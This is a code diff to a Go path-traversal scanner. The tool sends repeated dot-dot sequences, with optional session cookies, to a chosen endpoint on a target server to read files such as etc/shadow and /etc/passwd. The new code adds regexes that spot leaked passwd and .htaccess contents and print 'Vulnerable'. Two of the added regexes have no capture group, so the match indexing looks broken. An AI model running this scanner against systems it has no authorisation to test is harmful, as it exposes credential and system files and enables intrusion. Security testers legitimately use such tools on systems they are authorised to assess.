@@ -7,7 +7,10 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"regexp"
 	"strings"
+
+	"./utils"
 )
 
 var dotPatter = [...]string{"",
@@ -100,7 +103,7 @@ var filesPattern = []string{
 	"etc/shadow",
 }
 
-func sendRequests(url string, cookies string) {
+func sendRequests(url string, cookies string) string {
 
 	fmt.Println("[+] Sending request to: ", url)
 
@@ -114,8 +117,7 @@ func sendRequests(url string, cookies string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println(string(body))
-
+	return string(body)
 }
 
 func validateInput(url string, endpoint string) {
@@ -147,6 +149,8 @@ func validateURL(url string) {
 
 func main() {
 
+	utils.Banner()
+
 	url := flag.String("url", "", "url from target")
 	endPoint := flag.String("endpoint", "", "String in --url to attack. Ex: document.pdf")
 	cookies := flag.String("cookies", "", "Cookies from authenticated path")
@@ -162,6 +166,11 @@ func main() {
 	validateURL(*url)
 	validateURLendPoints(*url, *endPoint)
 
+	// regex to find
+	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
+	etcHosts := regexp.MustCompile(`\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]+:[\/a-zA-Z0-9]*`)
+	htAcess := regexp.MustCompile(`AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile`)
+
 	count := 0
 	for count != (*goin + 1) {
 		fmt.Println("[+] Depth: ", count)
@@ -171,11 +180,27 @@ func main() {
 					st := strings.Repeat(pattern, count)
 					fullPattern := inverted + st + file
 					requestPattern := *url + fullPattern
-					sendRequests(requestPattern, *cookies)
+					response := sendRequests(requestPattern, *cookies)
+
+					// hell if's to make sure that pattern is finding :)
+					matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
+					if len(matchEtcPasswd) != 0 {
+						fmt.Printf("---> [+] Vulnerable: %s\n", matchEtcPasswd[1])
+					}
+
+					matchEtcHosts := etcHosts.FindStringSubmatch(response)
+					if len(matchEtcHosts) != 0 {
+						fmt.Printf("---> [+] Vulnerable: %s\n", matchEtcHosts[1])
+					}
+
+					matchHtAcess := htAcess.FindStringSubmatch(response)
+					if len(matchHtAcess) != 0 {
+						fmt.Printf("---> [+] Vulnerable: %s\n", matchHtAcess[1])
+					}
+
 				}
 			}
 		}
 		count++
 	}
-
 }
